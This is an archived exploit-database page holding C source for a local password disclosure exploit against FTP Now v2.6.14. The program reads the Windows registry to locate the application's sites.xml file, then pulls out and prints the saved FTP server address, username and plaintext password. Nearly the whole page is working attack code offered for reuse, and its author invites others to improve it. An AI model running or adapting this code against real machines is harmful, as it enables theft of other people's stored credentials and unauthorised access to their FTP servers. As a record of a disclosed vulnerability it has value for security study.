<html><head><title>FTP Now <= 2.6.14 Local Password Disclosure Exploit </title></head><pre>/*******************************************************************

FTP Now v2.6.14 Local Password Disclosure Exploit by Kozan

Application: FTP Now v2.6.14 (and prior versions)
Vendor:www.network-client.com
Vulnerable Description: FTP Now v2.6.14 discloses passwords
to local users.

Discovered &amp; Coded by: Kozan
Credits to ATmaCA
Web: www.netmagister.com
Web2: www.spyinstructors.com
Mail: kozan@netmagister.com

*******************************************************************/

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;windows.h&gt;

HKEY hKey;
#define BUFSIZE 100
char prgfiles[BUFSIZE];
DWORD dwBufLen=BUFSIZE;
LONG lRet;

int adresal(char *FilePath,char *Str)
{
       char kr;
       int Sayac=0;
       int Offset=-1;
       FILE *di;
       di=fopen(FilePath,&quot;rb&quot;);

       if( di == NULL )
       {
               fclose(di);
               return -1;
       }

       while(!feof(di))
       {
               Sayac++;
               for(int i=0;i&lt;strlen(Str);i++)
               {
                       kr=getc(di);
                       if(kr != Str[i])
                       {
                               if( i&gt;0 )
                               {
                                       fseek(di,Sayac+1,SEEK_SET);
                               }
                               break;
                       }
                       if( i &gt; ( strlen(Str)-2 ) )
                       {
                               Offset = ftell(di)-strlen(Str);
                               fclose(di);
                               return Offset;
                       }
               }
       }
       fclose(di);
       return -1;
}

char *oku(char *FilePath,char *Str)
{

       FILE *di;
       char cr;
       int i=0;
       char Feature[500];

       int Offset = adresal(FilePath,Str);

       if( Offset == -1 )
               return &quot;&quot;;

       if( (di=fopen(FilePath,&quot;rb&quot;)) == NULL )
               return &quot;&quot;;

       fseek(di,Offset+strlen(Str),SEEK_SET);

       while(!feof(di))
       {
               cr=getc(di);
               if(cr == '&lt;')
                       break;
               Feature[i] = cr;
               i++;
       }

       Feature[i] = '\0';
       fclose(di);
       return Feature;
}

int main()
{
       if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                   &quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion&quot;,
                   0,
                   KEY_QUERY_VALUE,
                   &amp;hKey) == ERROR_SUCCESS)
   {

               lRet = RegQueryValueEx( hKey, &quot;ProgramFilesDir&quot;, NULL, NULL,
                                                      (LPBYTE) prgfiles, &amp;dwBufLen);

       if( (lRet != ERROR_SUCCESS) || (dwBufLen &gt; BUFSIZE) )
               {
                       RegCloseKey(hKey);
                       printf(&quot;An error occured!\n&quot;);
           exit(1);
       }

       RegCloseKey(hKey);

   }
       else
       {
       RegCloseKey(hKey);
               printf(&quot;An error occured!\n&quot;);
       exit(1);
   }

       strcat(prgfiles,&quot;\\FTP Now\\sites.xml&quot;);

       printf(&quot;FTP Now &lt;= v2.6.14 Local Exploit by Kozan\n&quot;);
       printf(&quot;Credits to ATmaCA\n&quot;);
       printf(&quot;www.netmagister.com  -  www.spyinstructors.com \n\n&quot;);
       printf(&quot;This exploit only show the first profile and its password.\n&quot;);
       printf(&quot;You may improve it freely...\n\n&quot;);

       char FtpAddress[BUFSIZE], FtpUsername[BUFSIZE], FtpPassword[BUFSIZE];

       strcpy(FtpAddress,oku(prgfiles,&quot;&lt;ADDRESS&gt;&quot;));
       strcpy(FtpUsername,oku(prgfiles,&quot;&lt;LOGIN&gt;&quot;));
       strcpy(FtpPassword,oku(prgfiles,&quot;&lt;PASSWORD&gt;&quot;));

       printf(&quot;Ftp Address   : %s\n&quot;,FtpAddress);
       printf(&quot;Ftp Username  : %s\n&quot;,FtpUsername);
       printf(&quot;Ftp Password  : %s\n&quot;,FtpPassword);

       return 0;
}

// milw0rm.com [2005-04-06]</pre></html>